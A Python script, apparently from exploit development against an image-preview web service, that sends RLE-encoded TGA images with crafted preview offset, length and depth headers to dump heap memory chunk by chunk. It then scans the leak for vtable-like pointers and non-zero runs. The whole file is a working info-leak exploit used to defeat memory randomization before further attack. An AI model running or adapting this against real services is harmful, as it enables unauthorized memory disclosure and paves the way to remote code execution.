#!/usr/bin/env python3
"""Recon: dump heap from the preview base for various shapes/grooming."""
import struct, sys
from raw import send_raw, parse, tga, tga_rle_raw

def leak(headers, body, nbytes, chunk=1024, start=0):
    data = b""; off = start
    while off < start + nbytes:
        h = list(headers) + [("X-Preview-Offset", str(off)),
                             ("X-Preview-Length", str(chunk)),
                             ("X-Preview-Depth", "2000000000")]
        head, b = parse(send_raw(h, body))
        if len(b) != chunk:
            return data, off
        data += b; off += chunk
    return data, None

def rle_fill(w, h, color=b"\x11\x22\x33"):
    return tga(w, h, imgtype=10, payload=tga_rle_raw(w * h, color))

def scan_vt(d):
    out = []
    for i in range(0, len(d) - 8, 8):
        v = struct.unpack_from("<Q", d, i)[0]
        if 0x500000000000 <= v <= 0x7fffffffffff:
            r = v & 0xfff
            if r in (0xd90, 0xdb8):
                out.append((i, hex(v)))
    return out

def runs(d, minlen=8):
    out = []; i = 0
    while i < len(d):
        if d[i]:
            j = i
            while j < len(d) and d[j]:
                j += 1
            if j - i >= minlen:
                out.append((i, j))
            i = j
        else:
            i += 1
    return out

if __name__ == "__main__":
    w, h = int(sys.argv[1]), int(sys.argv[2])
    n = int(sys.argv[3],0) if len(sys.argv) > 3 else 0x4000
    img = rle_fill(w, h)
    hdr = [("Content-Length", str(len(img)))]
    d, stop = leak(hdr, img, n)
    print(f"shape {w}x{h} size {w*h*3:#x}: leaked {len(d):#x} stop={stop and hex(stop)}")
    print("vtable hits:", scan_vt(d)[:10])
    print("runs:", [(hex(a), hex(b)) for a, b in runs(d)][:25])
